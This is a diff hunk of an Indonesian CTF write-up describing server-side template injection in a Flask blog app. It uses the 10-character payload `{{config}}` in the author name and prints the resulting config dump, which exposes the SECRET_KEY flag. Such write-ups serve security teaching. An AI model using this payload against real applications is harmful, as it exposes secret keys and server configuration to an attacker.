@@ -149,8 +149,8 @@ pada fungsi `add_post` terlihat bahwa author name yang kita input akan di simpan
 `name = session.get('name', 'anonymous')[:10]`. kemungkinan kita bisa melakukan template string injection.
 
 namun kita tidak bisa menggunakan payload yang lebih dari 10 karakter awalnya kita coba 
-"[[config.items()]] " tapi tidak menghasilkan apa karena > 10 karakter. dan setelah beberapa lama akhirnya di temukan flag dengan "[[config]]"
-pas 10 karakter.  Note "[] adalah {}".
+"\{\{config.items()\}\} " tapi tidak menghasilkan apa karena > 10 karakter. dan setelah beberapa lama akhirnya di temukan flag dengan "\{\{config\}\}"
+pas 10 karakter.
 
 ```html
 <p class="lead blog-description"><Config {'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_PATH': None, 'TRAP_HTTP_EXCEPTIONS': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_DOMAIN': None, 'USE_X_SENDFILE': False, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_HTTPONLY': True, 'SERVER_NAME': None, 'APPLICATION_ROOT': None, 'DEBUG': False, 'JSON_AS_ASCII': True, 'TESTING': False, 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'JSON_SORT_KEYS': True, 'LOGGER_NAME': 'post_manager', 'PREFERRED_URL_SCHEME': 'http', 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'hitcon{>_<---Do-you-know-<script>alert(1)</script>-is-very-fun?}', 'TRAP_BAD_REQUEST_ERRORS': False}>
